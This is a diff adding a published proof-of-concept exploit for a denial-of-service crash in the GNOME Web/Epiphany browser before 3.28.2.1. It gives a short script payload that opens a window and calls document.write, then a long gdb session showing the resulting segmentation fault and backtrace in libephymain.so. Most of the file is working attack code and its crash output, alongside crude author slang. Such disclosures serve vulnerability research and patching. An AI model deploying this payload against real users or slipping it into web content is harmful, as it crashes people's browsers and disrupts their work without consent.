@@ -1,0 +1,117 @@
+# Title: Gnome Web/Epiphany Browser < 3.28.2.1 - DoS App Crash (PoC)
+# Exploit Author: https://github.com/ldpreload
+# Date: 2018-06-06
+# Link: https://wiki.gnome.org/Apps/Web
+# Version: 3.28.2.1
+
+<!>
+
+libephymain.so in GNOME WEB/Epiphany < 3.28.2.1 allows a remote attacker to cause a Denial Of Service and crash the users browser. The cause of this is the "document.write"
+
+<!>
+
+PoC:
+
+<script>
+b1tch3z = window.open("https://www.google.com", "bl1ngbl1ng", "width=250,height=250");
+b1tch3z.document.write("<p>~ua b1tch3z</p>");
+
+// https://github.com/undergroundagency
+// https://github.com/ldpreload
+</script>
+
+Video PoC:
+https://vimeo.com/273769801
+
+<!>
+
+ld@b1tch3z:~$ gdb epiphany
+(gdb) run
+Starting program: /usr/bin/epiphany
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+
+[New Thread 0x7fffdf7ab700 (LWP 23486)]
+[New Thread 0x7fffdd929700 (LWP 23487)]
+[New Thread 0x7fffdd128700 (LWP 23488)]
+[New Thread 0x7fffd7fff700 (LWP 23489)]
+[New Thread 0x7fffd77fe700 (LWP 23490)]
+[New Thread 0x7fffd6ffd700 (LWP 23491)]
+[New Thread 0x7fffd67fc700 (LWP 23492)]
+[New Thread 0x7fffd5ffb700 (LWP 23493)]
+[New Thread 0x7fffd57fa700 (LWP 23494)]
+[New Thread 0x7fff8b4c4700 (LWP 23499)]
+[New Thread 0x7fff899bc700 (LWP 23503)]
+[New Thread 0x7fff88fff700 (LWP 23506)]
+[New Thread 0x7fff6bfff700 (LWP 23507)]
+[New Thread 0x7fff6ae5f700 (LWP 23514)]
+[New Thread 0x7fff6a65e700 (LWP 23521)]
+
+[Thread 0x7fff6a65e700 (LWP 23521) exited]
+[Thread 0x7fffd5ffb700 (LWP 23493) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23527)]
+[New Thread 0x7fff6a65e700 (LWP 23528)]
+[New Thread 0x7fff691f6700 (LWP 23529)]
+[New Thread 0x7fff689f5700 (LWP 23530)]
+[New Thread 0x7fff43fff700 (LWP 23531)]
+[New Thread 0x7fff3b7fe700 (LWP 23532)]
+[New Thread 0x7fff437fe700 (LWP 23533)]
+[Thread 0x7fff3b7fe700 (LWP 23532) exited]
+[Thread 0x7fff899bc700 (LWP 23503) exited]
+[Thread 0x7fff691f6700 (LWP 23529) exited]
+[Thread 0x7fff689f5700 (LWP 23530) exited]
+[Thread 0x7fff437fe700 (LWP 23533) exited]
+[Thread 0x7fff43fff700 (LWP 23531) exited]
+[Thread 0x7fff6a65e700 (LWP 23528) exited]
+[New Thread 0x7fff6a65e700 (LWP 23557)]
+[Thread 0x7fffd5ffb700 (LWP 23527) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23566)]
+[Thread 0x7fff6a65e700 (LWP 23557) exited]
+[Thread 0x7fffd5ffb700 (LWP 23566) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23591)]
+[New Thread 0x7fff6a65e700 (LWP 23592)]
+[Thread 0x7fffd5ffb700 (LWP 23591) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23597)]
+[Thread 0x7fffd5ffb700 (LWP 23597) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23612)]
+[Thread 0x7fff6a65e700 (LWP 23592) exited]
+[Thread 0x7fffd5ffb700 (LWP 23612) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23625)]
+[New Thread 0x7fff6a65e700 (LWP 23633)]
+[Thread 0x7fff6a65e700 (LWP 23633) exited]
+[New Thread 0x7fff6a65e700 (LWP 23644)]
+[Thread 0x7fff6a65e700 (LWP 23644) exited]
+[New Thread 0x7fff6a65e700 (LWP 23648)]
+[Thread 0x7fffd5ffb700 (LWP 23625) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23652)]
+[Thread 0x7fff6a65e700 (LWP 23648) exited]
+[New Thread 0x7fff6a65e700 (LWP 23656)]
+[Thread 0x7fff6a65e700 (LWP 23656) exited]
+[Thread 0x7fffd5ffb700 (LWP 23652) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23684)]
+[New Thread 0x7fff6a65e700 (LWP 23685)]
+[Thread 0x7fffd5ffb700 (LWP 23684) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23715)]
+[Thread 0x7fff6a65e700 (LWP 23685) exited]
+[New Thread 0x7fff6a65e700 (LWP 23741)]
+[Thread 0x7fffd5ffb700 (LWP 23715) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23773)]
+[Thread 0x7fffd5ffb700 (LWP 23773) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23811)]
+[Thread 0x7fff6a65e700 (LWP 23741) exited]
+[New Thread 0x7fff6a65e700 (LWP 23815)]
+[Thread 0x7fffd5ffb700 (LWP 23811) exited]
+[New Thread 0x7fffd5ffb700 (LWP 23823)]
+[Thread 0x7fff6a65e700 (LWP 23815) exited]
+
+Thread 43 "pool" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0x7fffd5ffb700 (LWP 23823)]
+0x00007ffff77bcb2d in ?? () from /usr/lib/epiphany/libephymain.so
+
+(gdb) bt
+#0  0x00007ffff77bcb2d in  () at /usr/lib/epiphany/libephymain.so
+#1  0x00007ffff6cb7e39 in  () at /usr/lib/libgio-2.0.so.0
+#2  0x00007ffff7040463 in  () at /usr/lib/libglib-2.0.so.0
+#3  0x00007ffff703fa2a in  () at /usr/lib/libglib-2.0.so.0
+#4  0x00007fffefa70075 in start_thread () at /usr/lib/libpthread.so.0
+#5  0x00007ffff7b1453f in clone () at /usr/lib/libc.so.6
